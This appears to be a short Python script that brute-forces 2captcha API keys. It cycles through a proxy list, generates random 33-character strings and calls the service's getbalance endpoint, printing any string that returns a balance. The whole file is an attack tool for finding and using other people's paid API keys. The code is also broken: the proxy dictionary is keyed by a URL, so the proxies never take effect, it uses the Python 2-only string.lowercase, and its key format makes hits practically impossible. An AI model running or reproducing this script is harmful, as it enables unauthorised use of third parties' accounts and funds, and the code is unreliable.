import requests
import random
import string
#proxies = {"https://2captcha.com/":}
#r = requests.get("", proxies=proxies)
#print(r.text)
a = open('proxylist.txt', 'r').readlines()
file = [ s.rstrip() for s in a ]
for lines in file:
	proxies = {"https://2captcha.com/":lines}
	letters = string.digits + string.lowercase
	randomString =  ''.join(random.choice(letters) for i in range(33)) 

	r = requests.get("https://2captcha.com/res.php?key=" + randomString + "&action=getbalance", proxies=proxies)
	if "." in r.text:
		print("Work ID : " + randomString + "Balance: " + r.text)
	else:
		print("Not Work ID : " + randomString + " " + r.text)

	

